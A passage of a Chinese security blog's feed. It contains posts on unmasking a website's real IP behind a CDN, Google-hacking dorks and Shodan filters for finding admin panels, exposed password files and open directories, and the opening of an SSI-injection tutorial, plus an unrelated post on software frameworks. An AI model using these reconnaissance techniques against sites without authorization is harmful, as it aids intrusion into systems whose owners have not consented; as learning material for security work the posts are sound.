href="https://ping.aizhan.com/" target="_blank" rel="noopener">https://ping.aizhan.com/</a></p></blockquote><h3 id="使用工具直接查询"><a href="#使用工具直接查询" class="headerlink" title="使用工具直接查询"></a>使用工具直接查询</h3><blockquote><p><a href="https://www.ipip.net/ip.html" target="_blank" rel="noopener">https://www.ipip.net/ip.html</a><br><a href="https://www.cdnplanet.com/tools/cdnfinder/" target="_blank" rel="noopener">https://www.cdnplanet.com/tools/cdnfinder/</a></p></blockquote><h2 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h2><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>某些企业业务线众多，有些站点的主站使用了CDN，或者部分域名使用了CDN，某些子域名可能未使用。查询子域名的方法就很多了：subDomainsBrute、Sublist3r、Google hack等。</p><blockquote><p>使用网站查询：<br><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a></p></blockquote><img src="/2019/11/13/绕过CDN的方法/0.png" title="xytk0x0"><h3 id="网站漏洞"><a href="#网站漏洞" class="headerlink" title="网站漏洞"></a>网站漏洞</h3><p>漏洞有可能会导致信息泄露。</p><p>若存在web漏洞，比如SSRF、XSS或能够得到反弹shell等，都有可能泄露真实的IP。</p><h3 id="历史DNS记录"><a href="#历史DNS记录" class="headerlink" title="历史DNS记录"></a>历史DNS记录</h3><p>查询ip与域名绑定历史记录，可能会发现使用CDN之前的目标ip。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询网站有：</span><br><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=</span><br><span class="line">http://viewdns.info/</span><br><span class="line">http://www.17ce.com/</span><br><span class="line">https://community.riskiq.com/</span><br><span class="line">http://www.crimeflare.com/cfssl.html</span><br></pre></td></tr></table></figure><h3 id="CDN本身"><a href="#CDN本身" class="headerlink" title="CDN本身"></a>CDN本身</h3><p>万能的社工~~</p><h3 id="Mx记录或邮件"><a href="#Mx记录或邮件" class="headerlink" title="Mx记录或邮件"></a>Mx记录或邮件</h3><p>很多站点都有发送邮件sendmail的功能，如Rss邮件订阅等。而且一般的邮件系统很多都是在内部，没有经过CDN的解析。可在邮件源码里面就会包含服务器的真实 IP。</p><h3 id="国外请求"><a href="#国外请求" class="headerlink" title="国外请求"></a>国外请求</h3><p>通过国外得一些冷门得DNS或IP去请求目标，很多时候国内得CDN对国外得覆盖面并不是很广，故此可以利用此特点进行探测。 通过国外代理访问就能查看真实IP了，或者通过国外的DNS解析，可能就能得到真实的IP查询网站：</p><blockquote><p><a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;相关链接： &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/ce98fbff39ac&quot; target=
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://xytk0x0.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>接受生活的不确定</title>
    <link href="https://xytk0x0.github.io/2019/11/12/%E6%8E%A5%E5%8F%97%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B8%8D%E7%A1%AE%E5%AE%9A/"/>
    <id>https://xytk0x0.github.io/2019/11/12/接受生活的不确定/</id>
    <published>2019-11-12T13:15:29.000Z</published>
    <updated>2019-11-23T15:11:24.165Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="输入密码：" />    <label for="hbePass">输入密码：</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="fc9e108d3cd99ab1b365bc65d7b98c04b32aebc99581f1998542ff95540d50ce"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章。如果你认识我的话，可以大胆猜一猜密码。
    
    </summary>
    
    
      <category term="日常生活的乱七八糟" scheme="https://xytk0x0.github.io/categories/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Blog里的胡言乱语" scheme="https://xytk0x0.github.io/tags/Blog%E9%87%8C%E7%9A%84%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>软件框架与架构</title>
    <link href="https://xytk0x0.github.io/2019/11/12/%E8%BD%AF%E4%BB%B6%E6%A1%86%E6%9E%B6%E4%B8%8E%E6%9E%B6%E6%9E%84/"/>
    <id>https://xytk0x0.github.io/2019/11/12/软件框架与架构/</id>
    <published>2019-11-12T03:46:51.000Z</published>
    <updated>2019-11-17T05:51:55.970Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近很迷~~</p><img src="/2019/11/12/软件框架与架构/v2-7850e71572f4f869c27f26b3e9035317.jpg" title="xytk0x0"><p>本篇大多是记录整理网上找到的东西，并且，我没有大型的软件开发经历，所以本篇将会极其片面，甚至会有一些错误的理解。</p><p>本篇将根据本人理解的变化持续更新。</p><p>相关链接：</p><p><a href="https://blog.csdn.net/binggetong/article/details/51371601" target="_blank" rel="noopener">https://blog.csdn.net/binggetong/article/details/51371601</a></p><p><a href="https://www.cnblogs.com/sunshine-1/p/7372934.html" target="_blank" rel="noopener">https://www.cnblogs.com/sunshine-1/p/7372934.html</a></p><h1 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>框架（framework）是整个或部分系统的可重用设计，表现为一组抽象构件及构件实例间交互的方法，另一种定义为，框架是可被应用开发者定制的应用骨架，前者是从应用方面而后者是从墓地的方面给出的定义。</p><p>框架是一个可服用的设计构件，通常以构件库的形式出现，但构架库只是框架的一个重要部分，框架的关键在于框架内对象间的的交互模式和控制流模式。</p><h2 id="框架和构件"><a href="#框架和构件" class="headerlink" title="框架和构件"></a>框架和构件</h2><p>框架比构件可定制性强。在某种程序上，将构件和框架看成两个不同但又彼此协作的技术更好。框架为构件提供重用的环境，为构件处理错误，交换数据及激活操作提供了标准的方法。</p><h2 id="应用框架"><a href="#应用框架" class="headerlink" title="应用框架"></a>应用框架</h2><p>应用框架是实现了某应用领域通用完备功能（除去特殊应用的部分）的底层服务。使用这种框架的编程人员可以在一个通用功能已经实现的基础上开始具体的系统开发，框架提供了所有应用期望的默认行为的类集合。具体的应用通过重写子类或组装对象来支持应用专用的行为。</p><h2 id="框架的特点"><a href="#框架的特点" class="headerlink" title="框架的特点"></a>框架的特点</h2><p>①其实就是某种应用的半成品，就是一组组件，供你选用完成你自己的系统，而且框架一般是成熟的，不断升级的软件。</p><p>②框架是一个可复用设计，它是由一组抽象类及其实例间协作关系来表达的。</p><p>③一个框架是在一个给定的问题领域内，一个应用程序的一部分设计与实现，也就是说框架是对特定应用领域中的应用系统的部分设计和实现。</p><h2 id="为什么要用框架"><a href="#为什么要用框架" class="headerlink" title="为什么要用框架"></a>为什么要用框架</h2><p>因为软件系统发展到今天已经很复杂了，特别是服务器端软件，涉及到的知识，内容，问题太多。在某些方面使用别人成熟的框架，就相当于让别人帮你完成一些基础工作，你只需要集中精力完成系统的业务逻辑设计。而且框架一般是成熟，稳健的，他可以处理系统很多细节问题，比如，事物处理，安全性，数据流控制等问题。还有框架一般都经过很多人使用，所以结构很好，所以扩展性也很好，而且它是不断升级的，你可以直接享受别人升级代码带来的好处。</p><h2 id="Python-web-框架"><a href="#Python-web-框架" class="headerlink" title="Python web 框架"></a>Python web 框架</h2><p>Django: Python Web应用开发框架<br>    Django 应该是最出名的Python框架，GAE甚至Erlang都有框架受它影响。Django是走大而全的方向，它最出名的是其全自动化的管理后台：只需要使用起ORM，做简单的对象定义，它就能自动生成数据库结构、以及全功能的管理后台。</p><p>Diesel：基于Greenlet的事件I/O框架<br>    Diesel提供一个整洁的API来编写网络客户端和服务器。支持TCP和UDP。</p><p>Flask：一个用Python编写的轻量级Web应用框架<br>    Flask是一个使用Python编写的轻量级Web应用框架。基于Werkzeug WSGI工具箱和Jinja2<br>模板引擎。Flask也被称为“microframework”，因为它使用简单的核心，用extension增加其他功能。Flask没有默认使用的数<br>据库、窗体验证工具。</p><p>Cubes：轻量级Python OLAP框架<br>    Cubes是一个轻量级Python框架，包含OLAP、多维数据分析和浏览聚合数据（aggregated data）等工具。</p><p>Kartograph.py：创造矢量地图的轻量级Python框架<br>    Kartograph是一个Python库，用来为ESRI生成SVG地图。Kartograph.py目前仍处于beta阶段，你可以在virtualenv环境下来测试。</p><p>Pulsar：Python的事件驱动并发框架<br>    Pulsar是一个事件驱动的并发框架，有了pulsar，你可以写出在不同进程或线程中运行一个或多个活动的异步服务器。</p><p>Web2py：全栈式Web框架<br>    Web2py是一个为Python语言提供的全功能Web应用框架，旨在敏捷快速的开发Web应用，具有快速、安全以及可移植的数据库驱动的应用，兼容Google App Engine。</p><p>Falcon：构建云API和网络应用后端的高性能Python框架<br>    Falcon是一个构建云API的高性能Python框架，它鼓励使用REST架构风格，尽可能以最少的力气做最多的事情。</p><p>Dpark：Python版的Spark<br>    DPark是Spark的Python克隆，是一个Python实现的分布式计算框架，可以非常方便地实现大规模数据处理和迭代计算。DPark由豆瓣实现，目前豆瓣内部的绝大多数数据分析都使用DPark完成，正日趋完善。</p><p>Buildbot：基于Python的持续集成测试框架<br>    Buildbot是一个开源框架，可以自动化软件构建、测试和发布等过程。每当代码有改变，服务器要求不同平台上的客户端立即进行代码构建和测试，收集并报告不同平台的构建和测试结果。</p><p>Zerorpc：基于ZeroMQ的高性能分布式RPC框架<br>    Zerorpc是一个基于ZeroMQ和MessagePack开发的远程过程调用协议（RPC）实现。和 Zerorpc 一起使用的 Service API 被称为 zeroservice。Zerorpc 可以通过编程或命令行方式调用。</p><p>Bottle: 微型Python Web框架<br>    Bottle是一个简单高效的遵循WSGI的微型python Web框架。说微型，是因为它只有一个文件，除Python标准库外，它不依赖于任何第三方模块。</p><p>Tornado：异步非阻塞IO的Python Web框架<br>    Tornado的全称是Torado Web Server，从名字上看就可知道它可以用作Web服务器，但同时它也是一个Python Web的开发框架。最初是在FriendFeed公司的网站上使用，FaceBook收购了之后便开源了出来。</p><p>webpy: 轻量级的Python Web框架<br>    webpy的设计理念力求精简（Keep it simple and powerful），源码很简短，只提供一个框架所必须的东西，不依赖大量的第三方模块，它没有URL路由、没有模板也没有数据库的访问。</p><p>Scrapy：Python的爬虫框架<br>    Scrapy是一个使用Python编写的，轻量级的，简单轻巧，并且使用起来非常的方便</p><h1 id="软件架构"><a href="#软件架构" class="headerlink" title="软件架构"></a>软件架构</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>软件架构（software architecture）是一系列相关的抽象模式，用于指导大型软件系统各个方面的设计，是一个系统的草图，描述的对象是直接构成系统的抽象组件。各个组件之间的连接明确细致的描述组件之间的通讯。</p><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>在实现阶段，这些抽象组件被细化为实际的组件，比如具体某个类或对象，在面向对象领域当中，组件之间的连接通常用接口来实现。软件体系结构是构建计算机软件实践的基础。</p><h2 id="要素"><a href="#要素" class="headerlink" title="要素"></a>要素</h2><p>①它是一个软件系统从整体到部分的最高层次的划分。</p><p>一个系统通常是由元件组成的，而这些元件如何形成、相互之间如何发生作用，则是关于这个系统本身结构的重要信息。详细地说，就是要包括架构元件（Architecture Component）、联结器（Connector）、任务流（Task-flow）。所谓架构元素，也就是组成系统的核心”砖瓦”，而联结器则描述这些元件之间通讯的路径、通讯的机制、通讯的预期结果，任务流则描述系统如何使用这些元件和联结器完成某一项需求。</p><p>②建造一个系统所作出的最高层次的、以后难以更改的，商业的和技术的决定。</p><p>在建造一个系统之前会有很多的重要决定需要事先作出，而一旦系统开始进行详细设计甚至建造，这些决定就很难更改甚至无法更改。显然，这样的决定必定是有关系统设计成败的最重要决定，必须经过非常慎重的研究和考察。</p><h2 id="设计目标"><a href="#设计目标" class="headerlink" title="设计目标"></a>设计目标</h2><p>1.可靠性（Reliable）。软件系统对于用户的商业经营和管理来说极为重要，因此软件系统必须非常可靠。</p><p>2.安全性（Secure）。软件系统所承担的交易的商业价值极高，系统的安全性非常重要。</p><p>3.可扩展性（Scalable）。软件必须能够在用户的使用率、用户的数目增加很快的情况下，保持合理的性能。只有这样，才能适应用户的市场扩展得可能性。</p><p>4.可定制化（Customizable）。同样的一套软件，可以根据客户群的不同和市场需求的变化进行调整。</p><p>5.可伸缩 （Extensible）。在新技术出现的时候，一个软件系统应当允许导入新技术，从而对现有系统进行功能和性能的扩展。</p><p>6.可维护性（Maintainable）。软件系统的维护包括两方面，一是排除现有的错误，二是将新的软件需求反映到现有系统中去。一个易于维护的系统可以有效地降低技术支持的花费。</p><p>7.客户体验（Customer Experience）。软件系统必须易于使用。</p><p>8.市场时机（Time to Market）。软件用户要面临同业竞争，软件提供商也要面临同业竞争。以最快的速度争夺市场先机非常重要。</p><h2 id="三层架构"><a href="#三层架构" class="headerlink" title="三层架构"></a>三层架构</h2><p>UI(表现层): 主要是指与用户交互的界面。用于接收用户输入的数据和显示处理后用户需要的数据。</p><p>BLL:(业务逻辑层): UI层和DAL层之间的桥梁。实现业务逻辑。业务逻辑具体包含：验证、计算、业务规则等等。</p><p>DAL:(数据访问层): 与数据库打交道。主要实现对数据的增、删、改、查。将存储在数据库中的数据提交给业务层，同时将业务层处理的数据保存到数据库。（当然这些操作都是基于UI层的。用户的需求反映给界面（UI），UI反映给BLL，BLL反映给DAL，DAL进行数据的操作，操作后再 一 一 返回，直到将用户所需数据反馈给用户）</p><h1 id="框架和架构的区别"><a href="#框架和架构的区别" class="headerlink" title="框架和架构的区别"></a>框架和架构的区别</h1><p>框架是软件，架构不是软件。</p><p>框架是一种特殊的软件，它并不能提供完整无缺的解决方案，而是为你构建解决方案提供良好的基础。框架是半成品。典型地，框架是系统或子系统的半成品；框架中的服务可以被最终应用系统直接调用，而框架中的扩展点是供应用开发人员定制的“可变化点”</p><p>软件架构不是软件，而是关于软件如何设计的重要决策。软件架构决策涉及到如何将软件系统分解成不同的部分、各部分之间的静态结构关系和动态交互关系等。经过完整的开发过程之后，这些架构决策将体现在最终开发出的软件系统中；当然，引入软件框架之后，整个开发过程变成了“分两步走”，而架构决策往往会体现在框架之中。</p><p>我们不能指着某些代码，说这就是软件架构，因为软件架构是比具体代码高一个抽象层次的概念。架构势必被代码所体现和遵循，但任何一段具体的代码都代表不了架构。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近很迷~~&lt;/p&gt;
&lt;img src=&quot;/2019/11/12/软件框架与架构/v2-7850e71572f4f869c27f26b3e9
      
    
    </summary>
    
    
      <category term="开发" scheme="https://xytk0x0.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="开发" scheme="https://xytk0x0.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>工具-Google&amp;&amp;Shodan</title>
    <link href="https://xytk0x0.github.io/2019/11/07/%E5%B7%A5%E5%85%B7-Google-Shodan/"/>
    <id>https://xytk0x0.github.io/2019/11/07/工具-Google-Shodan/</id>
    <published>2019-11-07T14:16:44.000Z</published>
    <updated>2019-11-08T07:15:00.306Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>这两个都勉强算是工具吧。两个搜索引擎，一个能爬出网络中的大部分页面，一个能够获取大部分在线设备的信息。</p><h1 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h1><p>以前看的没有现在看的系统和详细。</p><p>链接： <a href="https://blog.csdn.net/qq_36119192/article/details/84029809" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84029809</a></p><p>Google Hacking 是利用谷歌搜索的强大，来在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素出一些遗留后门，不想被发现的后台入口，中量级的搜索出一些用户信息泄露，源代码泄露，未授权访问等等，重量级的则可能是mdb文件下载，CMS 未被锁定install页面，网站配置密码，php远程文件包含漏洞等重要信息。</p><p>利用Google搜索我们想要的信息，需要配合谷歌搜索引擎的一些语法：</p><h2 id="基本搜索"><a href="#基本搜索" class="headerlink" title="基本搜索"></a>基本搜索</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">逻辑与：and</span><br><span class="line">逻辑或： or </span><br><span class="line">逻辑非： -</span><br><span class="line">完整匹配：&quot;关键词&quot; </span><br><span class="line">通配符：* ?</span><br></pre></td></tr></table></figure><h2 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h2><h3 id="intext"><a href="#intext" class="headerlink" title="intext"></a>intext</h3><p>寻找<strong>正文</strong>中含有关键字的网页</p><p>例：intext: 关键字</p><img src="/2019/11/07/工具-Google-Shodan/g0.png" title="XYTK"><h3 id="intitle"><a href="#intitle" class="headerlink" title="intitle"></a>intitle</h3><p>寻找<strong>标题</strong>中含有关键字的网页</p><img src="/2019/11/07/工具-Google-Shodan/g1.png" title="XYTK"><h3 id="allintitle"><a href="#allintitle" class="headerlink" title="allintitle"></a>allintitle</h3><p>用法与intitle相似，但可以指定多个词</p><p>例：allintitle: 后台管理 admin</p><img src="/2019/11/07/工具-Google-Shodan/g2.png" title="XYTK"><h3 id="inurl"><a href="#inurl" class="headerlink" title="inurl"></a>inurl</h3><p>url中有关键字</p><p>例：inurl:login</p><img src="/2019/11/07/工具-Google-Shodan/g3.png" title="XYTK"><h4 id="查找管理员登录页面"><a href="#查找管理员登录页面" class="headerlink" title="查找管理员登录页面"></a>查找管理员登录页面</h4><p>inurl:/admin/login.php</p><h4 id="查找数据库管理页面"><a href="#查找数据库管理页面" class="headerlink" title="查找数据库管理页面"></a>查找数据库管理页面</h4><p>inurl:/phpmyadmin/index.php</p><h3 id="allinurl"><a href="#allinurl" class="headerlink" title="allinurl"></a>allinurl</h3><p>与inurl类似，但可以指定多个词</p><p>例：inurl:login admin</p><h3 id="site"><a href="#site" class="headerlink" title="site"></a>site</h3><p>用于访问指定站点</p><img src="/2019/11/07/工具-Google-Shodan/g4.png" title="XYTK"><h3 id="filetype"><a href="#filetype" class="headerlink" title="filetype"></a>filetype</h3><p>指定访问的文件类型</p><img src="/2019/11/07/工具-Google-Shodan/g5.png" title="XYTK"><h3 id="link"><a href="#link" class="headerlink" title="link"></a>link</h3><p>指定链接的网页</p><img src="/2019/11/07/工具-Google-Shodan/g6.png" title="XYTK"><h3 id="related"><a href="#related" class="headerlink" title="related"></a>related</h3><p>搜索相似类型的网页(相似指网页布局)</p><h3 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h3><p>网页快照，谷歌将返回给你他存储下来的历史页面，如果你同时制定了其他查询词，将在搜索结果里以高亮显示，例如：cache:<a href="http://www.hackingspirits.com" target="_blank" rel="noopener">www.hackingspirits.com</a>  guest  ，将返回指定网站的缓存，并且正文中含有guest</p><h3 id="info"><a href="#info" class="headerlink" title="info"></a>info</h3><p>返回页面信息</p><h3 id="define"><a href="#define" class="headerlink" title="define"></a>define</h3><p>返回某个词语的定义</p><h3 id="phonebook"><a href="#phonebook" class="headerlink" title="phonebook"></a>phonebook</h3><p>电话簿查询美国街道地址和电话号码信息。</p><h2 id="几个例子"><a href="#几个例子" class="headerlink" title="几个例子"></a>几个例子</h2><h3 id="查找网站后台"><a href="#查找网站后台" class="headerlink" title="查找网站后台"></a>查找网站后台</h3><p>site:xx.com intext:管理</p><p>site:xx.com inurl:login</p><p>site:xx.com intitle:后台</p><h3 id="查看服务器使用的程序"><a href="#查看服务器使用的程序" class="headerlink" title="查看服务器使用的程序"></a>查看服务器使用的程序</h3><p>site:xx.com filetype:asp</p><p>site:xx.com filetype:php</p><p>site:xx.com filetype:jsp</p><p>site:xx.com filetype:aspx</p><h3 id="查看上传漏洞"><a href="#查看上传漏洞" class="headerlink" title="查看上传漏洞"></a>查看上传漏洞</h3><p>site:xx.com inurl:file</p><p>site:xx.com inurl:load</p><h3 id="index-of"><a href="#index-of" class="headerlink" title="index of"></a>index of</h3><p>发现允许目录遍历的网站。</p><p>index of /admin</p><p>index of /passwd</p><p>index of /password</p><p>index of /mail</p><p>“index of /“ +passwd</p><p>“index of /“ +password.txt</p><p>“index of /“ +.htaccess</p><p>“index of /root”</p><p>“index of /cgi-bin”</p><p>“index of /logs”</p><p>“index of /config”</p><h1 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h1><p>链接： <a href="https://www.freebuf.com/sectool/121339.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/121339.html</a></p><h2 id="搜索技巧"><a href="#搜索技巧" class="headerlink" title="搜索技巧"></a>搜索技巧</h2><p>hostname：搜索指定的主机或域名，例如 hostname:”google”</p><p>port：搜索指定的端口或服务，例如 port:”21”</p><p>country：搜索指定的国家，例如 country:”CN”</p><p>city：搜索指定的城市，例如 city:”Hefei”</p><p>org：搜索指定的组织或公司，例如 org:”google”</p><p>isp：搜索指定的ISP供应商，例如 isp:”China Telecom”</p><p>product：搜索指定的操作系统/软件/平台，例如 product:”Apache httpd”</p><p>version：搜索指定的软件版本，例如 version:”1.6.2”</p><p>geo：搜索指定的地理位置，参数为经纬度，例如 geo:”31.8639, 117.2808”</p><p>before/after：搜索指定收录时间前后的数据，格式为 dd-mm-yy，例如 before:”11-11-15”</p><p>net：搜索指定的IP地址或子网，例如 net:”210.45.240.0/24”</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;这两个都勉强算是工具吧。两个搜索引擎，一个能爬出网络中的大部分页面，一个能够获取大部分在线设备的信息。&lt;/p&gt;
&lt;h1 id
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="tools" scheme="https://xytk0x0.github.io/categories/tools/"/>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="信息收集" scheme="https://xytk0x0.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
      <category term="tools" scheme="https://xytk0x0.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试的完整流程(持续更新)</title>
    <link href="https://xytk0x0.github.io/2019/11/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/"/>
    <id>https://xytk0x0.github.io/2019/11/06/渗透测试的完整流程/</id>
    <published>2019-11-06T13:52:22.000Z</published>
    <updated>2019-11-17T06:13:27.081Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>由于种种原因，我不完全是从浅到深、从点到面地学习安全知识的，导致我会的东西很杂。之前我就有看过相当一部分渗透测试方面的内容，为把自己会的东西捋一捋，也为了复习一下并多动动手，就把这些东西记录下来。</p></blockquote><h1 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a>完整流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><h2 id="渗透报告"><a href="#渗透报告" class="headerlink" title="渗透报告"></a>渗透报告</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;由于种种原因，我不完全是从浅到深、从点到面地学习安全知识的，导致我会的东西很杂。之前我就有看过相当一部分渗透测试方
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SSI注入</title>
    <link href="https://xytk0x0.github.io/2019/10/30/SSI%E6%B3%A8%E5%85%A5/"/>
    <id>https://xytk0x0.github.io/2019/10/30/SSI注入/</id>
    <published>2019-10-30T08:09:07.000Z</published>
    <updated>2019-11-17T03:17:40.541Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>整理一下SSII(Server-Side-Includes Injection , 服务器端包含注入)，这种漏洞需要的环境较为严格，极其少见。</p><p>相关链接：</p><p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/66934.html</a></p><p><a href="https://www.guildhab.top/?p=1550" target="_blank" rel="noopener">https://www.guildhab.top/?p=1550</a></p><h1 id="SSI"><a href="#SSI" class="headerlink" title="SSI"></a>SSI</h1><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p><h2 id="SSI语法"><a href="#SSI语法" class="headerlink" title="SSI语法"></a>SSI语法</h2><p>.shtml ( Server-Parsed HTML ) 页面就是应用 SSI 技术的 HTML 文档 , 除此之外还有 .stm 页面 , .shtm 页面 . 该类页面在返回到客户端前 , 其中的 SSI 指令会被服务器解析 , 在最终返回给客户端的页面中是不包含 SSI 指令的 , 即使某些 SSI 指令没有被解析 , 浏览器也会将其作为普通的 HTML 注释处理。</p><h3 id="显示服务器端环境变量-lt-echo-gt"><a href="#显示服务器端环境变量-lt-echo-gt" class="headerlink" title="显示服务器端环境变量&lt;#echo&gt;"></a>显示服务器端环境变量&lt;#echo&gt;</h3><p>本文档名称：</p><p>&lt;!–#echo var=”DOCUMENT_NAME”–&gt;</p><p>现在时间：</p><p>&lt;!–#echo var=”DATE_LOCAL”–&gt;</p><p>显示IP地址：</p><p>&lt;! #echo var=”REMOTE_ADDR”–&gt;</p><h3 id="将文本内容直接插入到文档中-lt-include-gt"><a href="#将文本内容直接插入到文档中-lt-include-gt" class="headerlink" title="将文本内容直接插入到文档中&lt;#include&gt;"></a>将文本内容直接插入到文档中&lt;#include&gt;</h3><p>&lt;! #include file=”文件名称”–&gt;</p><!--#include virtual="index.html" --><p>&lt;! #include virtual=”文件名称”–&gt;</p><!--#include virtual="/www/footer.html" --><p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</p><h3 id="显示WEB文档相关信息-lt-flastmod-gt-lt-fsize-gt-如文件制作日期-大小等"><a href="#显示WEB文档相关信息-lt-flastmod-gt-lt-fsize-gt-如文件制作日期-大小等" class="headerlink" title="显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)"></a>显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</h3><p>文件最近更新日期：</p><p>&lt;! #flastmod file=”文件名称”–&gt;</p><p>文件的长度：</p><p>&lt;!–#fsize file=”文件名称”–&gt;</p><h3 id="直接执行服务器上的各种程序-lt-exec-gt-如CGI或其他可执行程序"><a href="#直接执行服务器上的各种程序-lt-exec-gt-如CGI或其他可执行程序" class="headerlink" title="直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)"></a>直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</h3><p>&lt;!–#exec 